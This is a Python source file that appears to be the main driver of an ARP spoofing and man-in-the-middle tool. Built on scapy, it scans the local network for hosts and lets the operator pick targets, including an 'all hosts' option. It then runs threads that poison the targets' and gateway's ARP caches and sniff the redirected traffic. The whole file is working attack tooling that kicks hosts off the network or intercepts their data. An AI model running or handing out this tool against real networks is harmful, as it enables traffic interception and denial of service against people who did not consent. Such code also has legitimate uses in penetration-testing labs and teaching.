from scapy.all import *
import argparse
import re
from get_hosts import get_all_hosts
from poisoner import kick_hosts, restore_hosts
import os
import sniffer
import threading
import logging
from colorama import init, Fore
import sys


#libpcap!!!!!!!!!!

white   = Fore.WHITE
black   = Fore.BLACK
red     = Fore.RED
reset   = Fore.RESET
blue    = Fore.BLUE
cyan    = Fore.CYAN
yellow  = Fore.YELLOW
green   = Fore.GREEN
magenta = Fore.MAGENTA

init()
logging.addLevelName(logging.CRITICAL, f"[{red}!!{reset}]")
logging.addLevelName(logging.WARNING, f"[{red}!{reset}]")
logging.addLevelName(logging.INFO, f"[{cyan}*{reset}]")
logging.addLevelName(logging.DEBUG, f"[{magenta}*{reset}]")
verbose = True
logging.basicConfig(format=f"%(levelname)s %(message)s", level=logging.DEBUG if verbose else logging.INFO)
logger = logging.getLogger("SPOFFER")
logging.getLogger("scapy.runtime").setLevel(logging.CRITICAL)



def get_defult_gateway(iface):
    packet = IP(dst="google.com", ttl=0)
    ans = sr1(packet,iface=iface, verbose=False)
    return ans.src

def get_mac(ip):
    try:
        arp_packet = ARP(pdst = ip)
        broadcast_packet = Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_to_broadcast = broadcast_packet / arp_packet
        answered_list = srp(arp_to_broadcast, timeout = 5, verbose = False)[0]
        return answered_list[0][1].hwsrc
    except Exception:
        return None



def main():
    parser = argparse.ArgumentParser("ARP poisener")

    parser.add_argument("--tip", help="""The IP of your target""", type=str)
    parser.add_argument("--gwy", help="""The IP of your target's gateway""", type=str)
    parser.add_argument("--iface", help="""1 if you want to see and select the interface""", type=int)

    args = parser.parse_args()

    ifname = conf.iface
    gateway = get_defult_gateway(ifname)
    targets = []

    if args.iface and args.iface==1:
        print("Available interfaces:\n")
        print(get_if_list())
        ifname = input("\nEnter your selected interface:\n")
        if ifname not in get_if_list():
            logger.critical("Invalid interface")
            exit()

    if args.gwy:
        gateway_validated = re.search(r"^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$", args.gwy)
        if not bool(gateway_validated):
            logger.critical("Invalid gateway IP!")
            exit()
        gateway = args.gwy
    
    if args.tip:
        tip_validated = re.search(r"^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$", args.tip)
        if not bool(tip_validated):
            logger.critical("Invalid target IP!")
            exit()
        targets = [args.tip]

    else:
        if os.geteuid() != 0:
            logger.critical("You need to be root to search hosts...\nYou can run this script with the --tip parameter to set the target ip manualy ")
            exit()
        logger.info("Serching for online hosts...\n")
        ans = get_all_hosts(ifname)
        if not ans or len(ans) == 0:
            logger.critical("No hosts...")
            exit()

        for i in range(len(ans)):
            if ans[i][0] == gateway:
                del ans[i]
                break

        logger.info(str(len(ans)) + " hosts found:\n")
        for i, host in enumerate(ans):
            print(str(i+1) + ": " + host[0] + " " + host[1])
        
        print("Which host would you like to kick? Enter their indexes (starting from 1) seperated by space. (For example: 1 3 6)\nIf you want to attack all hosts enter \"all\"")
        hosts_to_kick = input()

        if(hosts_to_kick == "all"):
            targets = [x[0] for x in ans]

        else:
            indexes = hosts_to_kick.split()

            for index in indexes:
                if not index.isdigit():
                    logger.critical("Invalid input at: "+ index)
                    exit()
                if int(index) > len(ans) or int(index) < 1:
                    logger.critical("Index out of bounds at: "+ index)
                    exit()
                try:
                    targets.append(ans[int(index)-1][0])
                except Exception:
                    logger.critical("Invalid input")
                    exit()


    targets_MAC = [get_mac(host) for host in targets]

    gateway_MAC = get_mac(gateway)


    try:
        sniff_thread = threading.Thread(name="Sniffer", target=sniffer.StartMITM, args= (targets, targets_MAC, gateway_MAC, ifname,))
        kick_thread = threading.Thread(name="ARP spoofer", target=kick_hosts, args=(targets, gateway, targets_MAC, gateway_MAC,))

        kick_thread.start()
        sniff_thread.start()
        kick_thread.join()
        sniff_thread.join()
        
        
    except KeyboardInterrupt:
        restore_hosts(targets, gateway, targets_MAC, gateway_MAC)
        exit()

if __name__ == "__main__":
    main()
